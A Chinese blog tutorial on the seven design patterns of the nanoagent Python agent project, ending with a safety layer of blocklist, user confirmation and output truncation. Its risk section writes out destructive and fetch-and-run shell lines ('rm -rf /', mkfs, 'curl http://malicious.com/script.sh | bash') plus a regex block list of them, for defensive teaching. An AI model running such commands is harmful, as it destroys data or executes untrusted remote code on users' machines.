---
layout:     post
title:      "NanoAgent 七种模式详解"
subtitle:   " \"Agent模式\""
date:       2015-01-29 12:00:00
author:     "fengyun"
header-img: "img/post-bg-2015.jpg"
tags:
    - agent
    - LLM
---

# NanoAgent 七种模式详解

> 基于 nanoagent 项目，从零开始理解 Agent 核心架构的完整演进

---

## 目录

1. [模式一：Essence（最小闭环）](#模式一essence最小闭环与工具调用)
2. [模式二：Memory（记忆与规划）](#模式二memory记忆规划与多步执行)
3. [模式三：Skills & MCP（可配置能力）](#模式三skills--mcp可配置能力)
4. [模式四：SubAgent（子智能体）](#模式四subagent子智能体与独立上下文)
5. [模式五：Teams（团队协作）](#模式五teams持久智能体与团队协作)
6. [模式六：Compact（上下文压缩）](#模式六compact上下文压缩与长任务续航)
7. [模式七：Safety（安全与Hook）](#模式七safety执行边界安全确认与hook化)

---

## 系列概述

| 模式 | 文件名 | 行数 | 核心主题 | 一句话总结 |
|------|--------|------|----------|------------|
| **01-Essence** | agent-essence.py | 103 | 工具 + 循环 | Agent 的最小本质 |
| **02-Memory** | agent-memory.py | 206 | 记忆 + 规划 | 记住过去，规划未来 |
| **03-Skills-MCP** | agent-skills-mcp.py | 282 | Rules + Skills + MCP | 扩展知识与工具 |
| **04-SubAgent** | agent-subagent.py | 192 | SubAgent | 一次性临时工 |
| **05-Teams** | agent-teams.py | 270 | Teams | 有记忆、有身份、能通信的正式团队 |
| **06-Compact** | agent-compact.py | 169 | 上下文压缩 | 记住要点，忘掉细节 |
| **07-Safety** | agent-safe.py | 219 | 安全与权限 | 能力越大，防线越重要 |

**总代码量：约 1441 行 Python**

---

## 模式一：Essence（最小闭环与工具调用）

### 核心问题
- Agent 和普通对话式 AI 的结构差异在哪里？
- LLM 为什么能"调用工具"，而工具真正是谁在执行？
- 一个最小可运行的 Agent 闭环需要哪些部件？

### 核心公式

```
Agent = LLM + 工具 + 循环
```

### 架构图

```
┌────────────────────────────────────────────┐
│           1. LLM 客户端初始化              │
├────────────────────────────────────────────┤
│           2. 工具定义（Tool Schema）       │
├────────────────────────────────────────────┤
│           3. 工具实现（Tool Functions）    │
├────────────────────────────────────────────┤
│           4. Agent 循环（Core Loop）       │
└────────────────────────────────────────────┘
```

### 核心循环（最精华的 20 行）

```python
def run_agent(user_message, max_iterations=5):
    messages = [
        {"role": "system", "content": "You are a helpful assistant..."},
        {"role": "user", "content": user_message}
    ]

    for _ in range(max_iterations):
        # Step 1: 把完整对话历史 + 工具列表发给 LLM
        response = client.chat.completions.create(
            model="gpt-4o-mini",
            messages=messages,
            tools=tools
        )

        message = response.choices[0].message
        messages.append(message)

        # Step 2: 如果 LLM 没有调用工具 → 任务完成
        if not message.tool_calls:
            return message.content

        # Step 3: 执行工具，把结果追加到对话历史
        for tool_call in message.tool_calls:
            function_name = tool_call.function.name
            function_args = json.loads(tool_call.function.arguments)
            function_response = available_functions[function_name](**function_args)
            messages.append({
                "role": "tool",
                "tool_call_id": tool_call.id,
                "content": function_response
            })
```

### 关键洞察

| 维度 | 普通对话（Chat） | Agent |
|------|------------------|-------|
| 交互模式 | 一问一答，用户驱动 | 自主循环，目标驱动 |
| 能力边界 | 只能生成文本 | 可以调用工具，作用于真实世界 |
| 执行流程 | `用户提问 → 模型回答` | `思考 → 调用工具 → 观察 → 继续思考 → ...` |
| 状态管理 | 每轮独立 | 维护完整的消息历史 |
| 自主性 | 无 | 模型自主决定"下一步做什么" |

### 工具定义示例

```python
tools = [
    {
        "type": "function",
        "function": {
            "name": "execute_bash",
            "description": "Execute a bash command on the system",
            "parameters": {
                "type": "object",
                "properties": {
                    "command": {"type": "string", "description": "The bash command to execute"}
                },
                "required": ["command"]
            }
        }
    },
    # read_file, write_file 类似
]
```

### 工具实现

```python
def execute_bash(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout + result.stderr
    except Exception as e:
        return f"Error: {str(e)}"
```

> **关键理解**：LLM 本身不会执行任何代码。它只是根据工具说明书，输出一段结构化的 JSON，表达"我想调用 execute_bash"。**真正的执行发生在 Python 代码里**。

---

## 模式二：Memory（记忆、规划与多步执行）

### 新增能力

| 能力 | agent-essence.py | agent-memory.py |
|------|------------------|-----------------|
| 跨会话记忆 | ❌ | ✅ `agent_memory.md` 文件持久化 |
| 任务规划 | ❌ | ✅ `create_plan()` 先拆解再执行 |
| 多步串联 | ❌ | ✅ 步骤间共享 `messages` 上下文 |

### 记忆系统

#### 存储：一个 Markdown 文件

```python
MEMORY_FILE = "agent_memory.md"

def save_memory(task, result):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"\n## {timestamp}\n**Task:** {task}\n**Result:** {result}\n"
    with open(MEMORY_FILE, 'a') as f:
        f.write(entry)
```

生成的记忆文件：
```markdown
## 2026-03-12 14:30:00
**Task:** 统计当前目录下的 Python 文件数量
**Result:** 当前目录下共有 42 个 Python 文件。

## 2026-03-12 15:00:00
**Task:** 创建一个 hello.py
**Result:** 已创建 hello.py，内容为打印 Hello World。
```

#### 加载：滑动窗口（只取最后 50 行）

```python
def load_memory():
    with open(MEMORY_FILE, 'r') as f:
        content = f.read()
    lines = content.split('\n')
    return '\n'.join(lines[-50:])  # 滑动窗口
```

#### 注入：塞进 System Prompt

```python
def run_agent_plus(task, use_plan=False):
    memory = load_memory()
    system_prompt = "You are a helpful assistant..."
    if memory:
        system_prompt += f"\n\nPrevious context:\n{memory}"
```

### 规划系统

```python
def create_plan(task):
    response = client.chat.completions.create(
        messages=[
            {"role": "system", "content": "Break down the task into 3-5 simple, actionable steps. Return as JSON array of strings."},
            {"role": "user", "content": f"Task: {task}"}
        ],
        response_format={"type": "json_object"}
    )
    plan_data = json.loads(response.choices[0].message.content)
    return plan_data.get("steps", [task])
```

### 两种执行范式对比

```
agent-essence.py (ReAct)              agent-memory.py (Plan-then-Execute)
                                                                             
思考 → 行动 → 观察                规划（全局思考）                            
  ↑         │                         │                                      
  └─────────┘                      步骤1 → 步骤2 → 步骤3                     
                                   (每步内部仍是 ReAct)                      
```

### 步骤间上下文传递

```python
def run_agent_step(task, messages, max_iterations=5):
    messages.append({"role": "user", "content": task})
    # ... 执行循环 ...
    return message.content, actions, messages  # 返回更新后的 messages

# 编排层：把步骤串起来
all_results = []
for i, step in enumerate(steps, 1):
    result, actions, messages = run_agent_step(step, messages)
    all_results.append(result)
```

**关键变化**：`messages` 从内部创建变为外部传入，多个步骤共享同一个对话历史。

---

## 模式三：Skills & MCP（可配置能力）

### 解决的问题

| 未解问题 | 解决方案 | 新概念 |
|---------|---------|--------|
| 工具是硬编码的 | 外部配置文件动态加载工具 | **MCP**（Model Context Protocol） |
| 没有行为约束 | 声明式规则文件注入 prompt | **Rules** + **Skills** |
| 规划是被动的 | 把规划注册为 Agent 可自主调用的工具 | **Plan-as-Tool** |

### 三层 System Prompt

```
最终 system prompt = 基础指令 + Rules（项目规则） + Skills（技能描述） + Memory（历史记忆）
```

### Rules（行为规则）

```python
RULES_DIR = ".agent/rules"

def load_rules():
    rules = []
    for rule_file in Path(RULES_DIR).glob("*.md"):
        with open(rule_file, 'r') as f:
            rules.append(f"# {rule_file.stem}\n{f.read()}")
    return "\n\n".join(rules)
```

示例规则文件 `.agent/rules/code-style.md`：
```markdown
- 使用 Python 3.10+ 语法
- 所有函数必须有 docstring
- 变量命名使用 snake_case
- 不要使用 print 调试，使用 logging 模块
```

### Skills（技能注册）

```python
SKILLS_DIR = ".agent/skills"

def load_skills():
    skills = []
    for skill_file in Path(SKILLS_DIR).glob("*.json"):
        with open(skill_file, 'r') as f:
            skills.append(json.load(f))
    return skills
```

示例 Skill 文件：
```json
{
  "name": "docker-deploy",
  "description": "Deploy application using Docker Compose...",
  "triggers": ["deploy", "docker", "container"]
}
```

### MCP（Model Context Protocol）

**MCP 是什么？**
- Anthropic 提出的开放标准
- 定义 LLM 与外部工具之间的通信协议
- 类比：AI 世界的 USB 接口

**配置文件** `.agent/mcp.json`：
```json
{
  "mcpServers": {
    "filesystem": {
      "disabled": false,
      "tools": [{
        "name": "list_directory",
        "description": "List contents of a directory",
        "parameters": {
          "type": "object",
          "properties": {"path": {"type": "string"}},
          "required": ["path"]
        }
      }]
    }
  }
}
```

**核心代码**：
```python
all_tools = base_tools + mcp_tools
```

### Plan-as-Tool

把规划本身注册为工具，让 LLM 自主触发：

```python
{"name": "plan", "description": "Break down complex task into steps...", ...}
```

递归执行与防无限循环：
```python
if function_name == "plan":
    # 递归调用 run_agent_step，但排除 plan 工具本身
    result, messages = run_agent_step(
        messages,
        [t for t in tools if t["function"]["name"] != "plan"]
    )
```

---

## 模式四：SubAgent（子智能体与独立上下文）

### 核心思想

主 Agent 作为协调者，把局部任务委派给拥有不同专业身份的执行单元。

### 生活类比

```
之前（一个人干所有活）:
  老板 → "小张，你把前端后端数据库全搞定"
         小张（一个人扛所有）

现在（项目经理 + 专人）:
  老板 → 项目经理（主 Agent）
              │
              ├── "后端用 FastAPI" → 后端工程师（SubAgent A）
              ├── "前端用 React"   → 前端工程师（SubAgent B）
              └── "验证能跑通"     → 测试工程师（SubAgent C）
```

### SubAgent 生命周期

```
生成 → 接收任务 → 干活（可以调用工具）→ 返回结果摘要 → 消亡
```

**一次性的**——没有持久身份，没有跨调用的记忆。

### 核心实现（仅 30 行新增）

```python
def subagent(role, task):
    """启动一个独立的 Agent 循环，拥有专属角色和独立上下文"""
    print(f"\n[SubAgent:{role}] 开始: {task}")

    # 关键 1：独立的 messages，独立的 system prompt
    sub_messages = [
        {"role": "system", "content": f"You are a {role}. Be concise and focused."},
        {"role": "user", "content": task}
    ]

    # 关键 2：排除 subagent 自身，防止无限递归
    sub_tools = [t for t in tools if t["function"]["name"] != "subagent"]

    # 关键 3：一个完整的 Agent 循环
    for _ in range(10):
        response = client.chat.completions.create(
            model=MODEL, messages=sub_messages, tools=sub_tools
        )
        message = response.choices[0].message
        sub_messages.append(message)

        if not message.tool_calls:
            return message.content

        for tc in message.tool_calls:
            fn = tc.function.name
            args = json.loads(tc.function.arguments)
            result = available_functions[fn](**args)
            sub_messages.append({"role": "tool", "tool_call_id": tc.id, "content": result})

    return "SubAgent: max iterations reached"
```

### SubAgent vs Plan 对比

| 维度 | Plan（第二篇） | SubAgent（本文） |
|------|--------------|-----------------|
| 上下文 | 所有步骤**共享** messages | 每个 SubAgent **独立** messages |
| 身份 | 同一个 Agent，同一个角色 | 每个 SubAgent **不同的专业角色** |
| 生命周期 | 步骤间 Agent 持续存在 | **生成 → 干活 → 返回摘要 → 消亡**（一次性） |
| 跨次记忆 | 步骤 2 能看到步骤 1 的全部细节 | SubAgent B 看不到 SubAgent A 做了什么 |
| 适合 | 步骤之间有依赖 | 子任务之间相对独立 |
| 类比 | 一个人按步骤做事 | 叫了个跑腿临时工，干完就走 |

---

## 模式五：Teams（持久智能体与团队协作）

### 从临时工到正式员工

| | SubAgent（临时工） | Teams Agent（正式员工） |
|--|--|--|
| 有名字吗？ | ❌ 只有一个临时角色描述 | ✅ 有名字（alice）、有固定角色 |
| 记得上次做了什么吗？ | ❌ 每次调用都失忆 | ✅ 多次交互之间记忆持续累积 |
| 能收到同事消息吗？ | ❌ 互相看不到 | ✅ 有收件箱，能收消息 |
| 什么时候消失？ | 函数返回就没了 | 团队解散才消失 |

### 核心实现：两个类

#### Agent 类

```python
class Agent:
    def __init__(self, name, role):
        self.name = name                # 身份：有名字
        self.role = role                # 身份：有角色
        self.inbox = []                 # 通信：收件箱
        self.messages = [               # 记忆：持久保持
            {"role": "system", "content": f"You are {name}, a {role}."}
        ]
```

**关键变化**：`messages` 从函数的局部变量变成了对象的实例属性。

#### Team 类

```python
class Team:
    def __init__(self):
        self.agents = {}  # name → Agent

    def hire(self, name, role):
        """招募：创建一个持久 Agent"""
        agent = Agent(name, role)
        self.agents[name] = agent
        return agent

    def send(self, from_name, to_name, message):
        """点对点通信"""
        self.agents[to_name].receive(from_name, message)

    def broadcast(self, from_name, message):
        """广播：给团队所有其他人发消息"""
        for name, agent in self.agents.items():
            if name != from_name:
                agent.receive(from_name, message)

    def disband(self):
        """解散：所有 Agent 生命周期结束"""
        self.agents.clear()
```

### 完整协作流程

```python
def run_team(task):
    team = Team()

    # 第 1 阶段：组建团队
    members = plan_team(task)
    for m in members:
        team.hire(m["name"], m["role"])

    # 第 2 阶段：逐个执行，每人干完广播成果
    for m in members:
        agent = team.agents[m["name"]]
        result = agent.chat(m["task"])
        team.broadcast(m["name"], f"我完成了任务。摘要: {result[:200]}")

    # 第 3 阶段：最后一个成员做二次审查
    reviewer = team.agents[members[-1]["name"]]
    review = reviewer.chat("请根据团队成果做最终审查")

    # 第 4 阶段：解散
    team.disband()
```

### 三大核心能力

| 能力 | 代码体现 |
|------|---------|
| 持久记忆 | `self.messages` 是实例属性，多次 `chat()` 调用间持续累积 |
| 身份管理 | `name` + `role`，有明确的身份标识 |
| 通信通道 | `inbox` + `send()` + `broadcast()` |

---

## 模式六：Compact（上下文压缩与长任务续航）

### 问题：messages 会无限增长

```
第 1 轮: messages += [LLM的回复, 工具的返回结果]
第 2 轮: messages += [LLM的回复, 工具的返回结果]
第 3 轮: messages += [LLM的回复, 工具的返回结果]
...
```

**后果**：超过 context window，API 报错 `context_length_exceeded`

### 压缩原理

```
压缩前的 messages（30 条，快爆了）:
┌────────────────────────────────────────────────────────┐
│ system │ ← 永远保留
├────────────────────────────────────────────────────────┤
│ user   │ ← 最初的任务
│ assist │ ← LLM 调用了 bash
│ tool   │ ← bash 输出了 200 行
│ ...    │ ← 更多历史（要被压缩）
│ assist │ ← LLM 准备写文件
│ tool   │ ← 写入成功
│ assist │ ← LLM 调用 read 验证 ← 最近 6 条（保留）
│ tool   │ ← 文件内容
│ user   │ ← 当前操作
└────────────────────────────────────────────────────────┘

        ↓ compact_messages() ↓

压缩后的 messages（9 条，清爽了）:
┌────────────────────────────────────────────────────────┐
│ system │ ← 永远保留（不动）
├────────────────────────────────────────────────────────┤
│ user   │ ← "之前的对话摘要：找到了 42 个 Python 文件..."
│ assist │ ← "明白了，我继续。"
├────────────────────────────────────────────────────────┤
│ assist │ ← LLM 准备写文件 ← 最近 6 条（完整保留）
│ tool   │ ← 写入成功
│ ...    │
│ user   │ ← 当前操作
└────────────────────────────────────────────────────────┘
```

### 核心实现（仅 30 行）

```python
COMPACT_THRESHOLD = 20  # 超过 20 条就压缩
KEEP_RECENT = 6         # 保留最近 6 条不压缩

def compact_messages(messages):
    if len(messages) <= COMPACT_THRESHOLD:
        return messages

    system_msg = messages[0]                   # system prompt 永远保留
    old_messages = messages[1:-KEEP_RECENT]     # 旧消息 → 要被压缩
    recent_messages = messages[-KEEP_RECENT:]   # 最近的消息 → 保留原样

    # 把旧消息拼成文本
    old_text = "\n".join([f"[{m['role']}]: {m['content']}" for m in old_messages])

    # 调用 LLM 生成摘要
    summary_response = client.chat.completions.create(
        model=MODEL,
        messages=[
            {"role": "system", "content": "Summarize the following conversation history..."},
            {"role": "user", "content": old_text}
        ]
    )
    summary = summary_response.choices[0].message.content

    # 重新组装
    return [
        system_msg,
        {"role": "user", "content": f"[Previous conversation summary]: {summary}"},
        {"role": "assistant", "content": "Understood. I have the context from our previous conversation."},
        *recent_messages
    ]
```

### 在循环中调用

```python
def run_agent(user_message, max_iterations=30):
    messages = [...]

    for i in range(max_iterations):
        messages = compact_messages(messages)  # ← 每轮检查
        response = client.chat.completions.create(...)
        ...
```

### 压缩效果

```
轮次 1: messages = 2   (system + user)
轮次 2: messages = 4
轮次 3: messages = 6
轮次 4: messages = 8
轮次 5: messages = 10
         ↓ 触发压缩！
轮次 6: messages = 9   (system + 摘要 + ack + 最近6条)
轮次 7: messages = 11
         ↓ 再次触发压缩！
轮次 8: messages = 9
```

messages 数量像锯齿波一样：涨到阈值 → 压缩回去 → 继续涨 → 再压缩。**永远不会超过阈值太多，Agent 可以无限工作下去。**

---

## 模式七：Safety（执行边界、安全确认与 Hook 化）

### 风险示例

```bash
# LLM 想"清理临时文件"，但路径搞错了
rm -rf /

# LLM 想"重置数据库"，结果格式化了磁盘
mkfs.ext4 /dev/sda1

# LLM 在网上"找到了一个解决方案"
curl http://malicious.com/script.sh | bash

# LLM 陷入循环，输出了 10MB 的文件内容
cat /var/log/syslog
```

### 三道防线

```
LLM 输出一条命令
  │
  ▼
防线 1: 命令黑名单
  │ "rm -rf /" → 🚫 直接拦截
  │ "ls -la"   → ✅ 通过
  ▼
防线 2: 用户确认
  │ "find . -name '*.py'" → 用户按 Y 放行
  │                        → 用户按 N 跳过
  │                        → 用户按 Q 终止
  ▼
防线 3: 输出截断
  │ 命令输出 10000 行 → 截断为首尾各 2500 字符
  ▼
结果返回给 LLM
```

### 防线 1：命令黑名单

```python
DANGEROUS_PATTERNS = [
    r'\brm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+|.*--no-preserve-root)',  # rm -rf
    r'\bmkfs\b',                    # 格式化磁盘
    r'\bdd\s+.*of\s*=\s*/dev/',     # 覆写磁盘
    r':\(\)\s*\{',                  # fork bomb
    r'\bcurl\b.*\|\s*(ba)?sh',      # curl | bash
    r'\bshutdown\b',                # 关机
    r'\breboot\b',                  # 重启
]

def is_dangerous(command):
    for pattern in DANGEROUS_PATTERNS:
        if re.search(pattern, command):
            return True, pattern
    return False, None
```

### 防线 2：用户确认

```python
def ask_user_confirmation(tool_name, args):
    if AUTO_APPROVE:
        return True

    print(f"\n┌─ 确认执行 ─────────────────────────────")
    print(f"│ 工具: {tool_name}")
    for key, value in args.items():
        print(f"│ {key}: {str(value)[:200]}")
    print(f"└────────────────────────────────────────")

    while True:
        answer = input("[Y]执行 / [N]跳过 / [Q]终止 Agent > ").strip().lower()
        if answer in ('y', 'yes', ''):
            return True
        elif answer in ('n', 'no'):
            return False
        elif answer in ('q', 'quit'):
            sys.exit(0)
```

### 防线 3：输出截断

```python
MAX_OUTPUT_LENGTH = 5000

def truncate_output(text):
    if len(text) <= MAX_OUTPUT_LENGTH:
        return text
    half = MAX_OUTPUT_LENGTH // 2
    return (
        text[:half]
        + f"\n\n... [输出过长，已截断。原始 {len(text)} 字符] ...\n\n"
        + text[-half:]
    )
```

### 三道防线串联

```python
def execute_bash(command):
    # 防线 1: 黑名单
    dangerous, pattern = is_dangerous(command)
    if dangerous:
        return f"🚫 命令被拦截: {command}"

    # 防线 2: 用户确认
    if not ask_user_confirmation("execute_bash", {"command": command}):
        return "用户跳过了此命令。"

    # 执行
    result = subprocess.run(command, shell=True, ...)

    # 防线 3: 输出截断
    return truncate_output(result.stdout + result.stderr)
```

### 进化方向：Hook 管道

生产级实现会把检查抽象成 **Hook（钩子）机制**：

```python
# 定义 Hook 管道
before_hooks = [check_blacklist, ask_confirmation, log_command]
after_hooks  = [truncate_output, log_result]

# 通用的工具执行函数
def execute_tool(name, args):
    # 执行前：依次过所有 before hook
    for hook in before_hooks:
        blocked, msg = hook(name, args)
        if blocked:
            return msg

    # 实际执行
    result = available_functions[name](**args)

    # 执行后：依次过所有 after hook
    for hook in after_hooks:
        result = hook(name, result)

    return result
```

---

## 完整架构全景

```
┌────────────────────────────────────────────────────────────────┐
│                    Agent 架构全景                              │
│                                                                │
│  ┌──────────────┐  第七篇 (Safety)                            │
│  │  Safety      │  安全防线层 ──── 黑名单/确认/截断/Hook       │
│  ├──────────────┤  第六篇 (Compact)                           │
│  │  Compact     │  上下文压缩层 ── compact_messages()         │
│  ├──────────────┤  第五篇 (Teams)                             │
│  │  Teams       │  多智能体协作 ── Agent 类 + Team 类          │
│  ├──────────────┤  第四篇 (SubAgent)                          │
│  │  SubAgent    │  子智能体委派 ── subagent() 函数            │
│  ├──────────────┤  第三篇 (Skills-MCP)                        │
│  │  Rules       │  行为约束层 ──── .agent/rules/              │
│  │  Skills      │  技能知识层 ──── .agent/skills/             │
│  │  MCP         │  工具扩展层 ──── .agent/mcp.json            │
│  │  Plan Tool   │  自主规划层 ──── plan() 作为工具            │
│  ├──────────────┤  第二篇 (Memory)                            │
│  │  Memory      │  持久记忆层 ──── agent_memory.md            │
│  │  Planning    │  任务分解层 ──── create_plan()              │
│  │  Multi-step  │  多步编排层 ──── 步骤间上下文共享           │
│  ├──────────────┤  第一篇 (Essence)                           │
│  │  LLM         │  推理决策层 ──── OpenAI API                 │
│  │  Tools       │  工具执行层 ──── bash/read/write            │
│  │  Loop        │  核心循环层 ──── for + tool_calls           │
│  └──────────────┘                                              │
└────────────────────────────────────────────────────────────────┘
```

---

## 学习路径建议

### 初学者路径

1. **先读第一篇**（Essence）—— 理解 Agent 的最小本质
2. **动手跑代码** —— 修改工具，观察 Agent 的行为变化
3. **读第二篇**（Memory）—— 理解记忆和规划
4. **对比代码差异** —— 看 103 行如何进化到 206 行

### 进阶路径

5. **读第三篇**（Skills-MCP）—— 理解可配置架构
6. **尝试添加自己的 Skill** —— 实践 Rules 和 MCP
7. **读第四、五篇**（SubAgent/Teams）—— 理解多智能体协作
8. **对比 SubAgent 和 Teams 的适用场景**

### 生产化路径

9. **读第六篇**（Compact）—— 理解长任务续航
10. **读第七篇**（Safety）—— 理解安全防线
11. **思考 Hook 化设计** —— 如何应用到自己的项目

---

## 核心设计思想总结

| 思想 | 体现 |
|------|------|
| **一切能力都是工具** | read/write/bash/subagent/plan 都是工具 |
| **控制流在 LLM 手里** | 代码只提供能力，LLM 决定何时使用 |
| **数据位置决定生命周期** | `messages` 放函数里 → SubAgent；放实例属性里 → Teams Agent |
| **约束即设计** | 用工具的约束引导 LLM 行为，比 prompt 更可靠 |
| **分层压缩** | 旧的压缩，近的保留，要点不丢 |
| **防御纵深** | 黑名单 + 用户确认 + 输出截断，层层过滤 |

---

> "The question is not what you look at, but what you see." — Henry David Thoreau
>
> 看过这 1441 行代码之后，当你再打开 OpenClaw、Claude Code、Cursor 或任何 Agent 产品时，你看到的不再是"魔法"，而是：一个循环、几个工具、一段记忆、一份规则，以及一套可扩展接口。

---

**参考项目**: [nanoagent](https://github.com/nanoagent/nanoagent)  



